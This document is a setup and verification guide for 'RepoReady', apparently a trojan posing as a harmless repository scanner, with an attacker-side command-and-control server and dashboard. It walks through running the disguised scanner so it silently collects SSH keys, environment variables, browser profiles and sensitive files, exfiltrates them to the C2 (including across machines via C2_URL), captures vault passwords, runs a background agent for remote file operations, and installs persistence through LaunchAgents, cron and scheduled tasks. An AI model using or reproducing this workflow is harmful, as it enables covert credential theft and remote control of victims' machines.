# RepoReady — Cross-Platform Setup & Verification Guide

## Prerequisites (All Platforms)

| Requirement | Version | Check |
|------------|---------|-------|
| **Node.js** | v16+ | `node --version` |
| **npm** | v8+ | `npm --version` |
| **Git** | any | `git --version` |

---

## Step 1: Clone & Install

Same on all platforms:

```bash
git clone <your-repo-url>
cd repoready
npm install
```

---

## Step 2: Architecture Overview

```
┌──────────────────┐         ┌──────────────────────┐
│  VICTIM MACHINE  │         │  ATTACKER MACHINE     │
│                  │         │                       │
│  node bin/cli.js │         │  node server/server.js│
│       │          │         │       │               │
│       ▼          │  HTTP   │       ▼               │
│  agent.js ───────┼────────►│  C2 Server :3000      │
│  (background)    │  polls  │       │               │
│                  │         │       ▼               │
│  stealthCollect  │────────►│  /dashboard           │
│  + exfil.js      │  sends  │  (view all data)      │
└──────────────────┘  data   └──────────────────────┘
```

> [!IMPORTANT]
> For a local demo, both run on the **same machine**. For a cross-machine demo, change `C2_URL` to point to the attacker's IP.

---

## Step 3: Start the C2 Server (Attacker Side)

### macOS / Linux
```bash
node server/server.js
```

### Windows (CMD)
```cmd
node server\server.js
```

### Windows (PowerShell)
```powershell
node server/server.js
```

The server starts on **port 3000**. You should see:

```
╔══════════════════════════════════════════════╗
║     ☠️  RepoReady C2 Server Active  ☠️       ║
╠══════════════════════════════════════════════╣
║  Dashboard: http://localhost:3000/dashboard  ║
╚══════════════════════════════════════════════╝
```

Open **http://localhost:3000/dashboard** in a browser.

---

## Step 4: Run the Scan (Victim Side)

This is what the "victim" runs. It looks like an innocent repo scanner but silently:
1. Collects system data (SSH keys, env vars, browser profiles, etc.)
2. Encrypts and sends it to the C2 server
3. Spawns a background agent for remote file CRUD

### macOS / Linux
```bash
# Scan a local folder
node bin/cli.js scan .

# Scan a remote repo
node bin/cli.js scan https://github.com/some/repo.git

# Interactive mode (also triggers everything)
node bin/cli.js
```

### Windows (CMD)
```cmd
node bin\cli.js scan .
```

### Windows (PowerShell)
```powershell
node bin/cli.js scan .
```

### Cross-Machine Demo
If the C2 server is on a different machine (e.g., IP `192.168.1.50`):

```bash
# macOS / Linux
C2_URL=http://192.168.1.50:3000 node bin/cli.js scan .

# Windows CMD
set C2_URL=http://192.168.1.50:3000 && node bin\cli.js scan .

# Windows PowerShell
$env:C2_URL="http://192.168.1.50:3000"; node bin/cli.js scan .
```

---

## Step 5: Verify Everything Works

### ✅ 5a. Check if Data Was Exfiltrated

**On the dashboard:** Open `http://localhost:3000/dashboard`

You should see:
- **Total Victims** count increases
- Clicking a victim shows their collected data:
  - 📊 System info (hostname, OS, CPU, RAM)
  - 🔑 Environment variables
  - 🔐 SSH keys
  - 🌐 Browser profiles
  - 📶 Wi-Fi SSIDs
  - 📱 Installed apps
  - ⚠️ Sensitive files

**Via API:**
```bash
curl http://localhost:3000/api/victims | node -e "process.stdin.on('data',d=>console.log(JSON.parse(d).victims.length+' victims'))"
```

**Check server terminal:** You'll see logs like:
```
[COLLECT] hostname-xxxxx — chunk 1/3 (1/3 received)
[COLLECT] hostname-xxxxx — chunk 2/3 (2/3 received)
[COLLECT] hostname-xxxxx — chunk 3/3 (3/3 received)
[COLLECT] ✅ hostname-xxxxx — data decrypted and stored
```

---

### ✅ 5b. Check if Background Agent is Running

#### macOS / Linux
```bash
ps aux | grep agent.js | grep -v grep
```
You should see something like:
```
user  12345  0.0  0.3  node /path/to/lib/agent.js
```

#### Windows (CMD / PowerShell)
```cmd
tasklist | findstr node
```
Or in PowerShell:
```powershell
Get-Process node | Format-Table Id, ProcessName, Path
```

---

### ✅ 5c. Test Remote CRUD Commands

1. Go to `http://localhost:3000/dashboard`
2. Scroll to **🎯 Remote File Operations**
3. Test these commands:

| Action | Path | Content | Expected |
|--------|------|---------|----------|
| **Create** | `/tmp/hacked.txt` | `You've been hacked!` | ✅ File created |
| **Read** | `/tmp/hacked.txt` | _(leave empty)_ | ✅ Shows content |
| **Update** | `/tmp/hacked.txt` | `Modified by attacker` | ✅ File updated |
| **Delete** | `/tmp/hacked.txt` | _(leave empty)_ | ✅ File deleted |

> [!NOTE]
> On **Windows**, use paths like `C:\Users\Public\hacked.txt` instead of `/tmp/hacked.txt`.

The command history section shows results with ✅ (success) or ❌ (error) and the full result message.

---

### ✅ 5d. Test Vault Password Capture

```bash
# Create test files
mkdir -p test/demo-files
echo "secret data" > test/demo-files/secret.txt

# Lock the vault (password gets sent to C2!)
node bin/cli.js vault lock test/demo-files mypassword123
```

**Check the dashboard** → you'll see **🔑 Captured Vault Passwords** showing:
- The password (`mypassword123`)
- The folder path
- File count

**To unlock (restore files):**
```bash
node bin/cli.js vault unlock test/demo-files mypassword123
```

---

### ✅ 5e. Test Persistence (agent enable)

```bash
node bin/cli.js agent enable
```

This does:
- **macOS**: Creates a LaunchAgent plist (auto-starts on login)
- **Linux**: Adds a `@reboot` cron job
- **Windows**: Creates a scheduled task via `schtasks`

To remove:
```bash
node bin/cli.js agent disable
```

---

### ✅ 5f. Verify Agent Survives CLI Exit

1. Run the scan: `node bin/cli.js scan .`
2. Exit the CLI (choose 🚪 Exit)
3. Check if agent is still running:
   ```bash
   # macOS/Linux
   ps aux | grep agent.js | grep -v grep
   
   # Windows
   tasklist | findstr node
   ```
4. The agent should still be running and polling the C2 server

---

## Step 6: Kill the Agent (Cleanup)

#### macOS / Linux
```bash
pkill -f "node.*agent.js"
```

#### Windows (CMD)
```cmd
taskkill /F /IM node.exe
```
> ⚠️ This kills ALL node processes. To be more precise, find the PID first with `tasklist`.

---

## Quick Reference: Full Demo Flow

```bash
# Terminal 1 — Attacker (start C2 server)
node server/server.js

# Terminal 2 — Victim (run the "innocent" scanner)
node bin/cli.js scan https://github.com/some/repo.git

# Browser — Attacker views dashboard
# → http://localhost:3000/dashboard
# → See victim data appear
# → Issue remote CRUD commands
# → Watch results come back live
```

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| No victim data on dashboard | Make sure `server/server.js` is running **before** the scan |
| Agent not spawning | Run with `DEBUG=true node bin/cli.js scan .` to see debug logs |
| Connection refused | Check C2_URL matches the server address and port |
| Windows path errors in CRUD | Use backslashes `C:\path\to\file` or forward slashes `C:/path/to/file` |
| Port 3000 in use | `PORT=4000 node server/server.js` and `C2_URL=http://localhost:4000 node bin/cli.js scan .` |
